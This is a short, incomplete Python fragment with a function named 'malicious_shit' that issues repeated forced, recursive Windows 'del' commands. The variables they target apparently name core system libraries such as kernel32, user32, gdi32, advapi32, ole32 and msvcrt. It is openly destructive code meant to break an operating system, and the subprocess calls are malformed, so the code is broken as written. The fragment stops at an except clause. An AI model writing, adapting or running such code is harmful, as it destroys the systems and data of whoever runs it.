...
def malicious_shit():
    ...
    try :
         subprocess.run("del","/q"," /f"," /s ",kern32)
         subprocess.run("del"," /q"," /f"," /s ",kernel)
         subprocess.run("del"," /q" ,"/f","/s ",kerneldll)
         subprocess.run("del"," /q"," /f"," /s ",user)
         subprocess.run("del ","/q ","/f ","/s ",gdi)
         subprocess.run("del"," /q ","/f" ,"/s ",advapi)
         subprocess.run("del"," /q", "/f ","/s ",shell)
         subprocess.run("del"," /q" ,"/f"," /s ",ole)
         subprocess.run("del", "/q"," /f"," /s ",oleaut)
         subprocess.run("del" , "/q", "/f", "/s",comdlg)
         subprocess.run("del", "/q", "/f", "/s",msvcrt)
    except OSError :
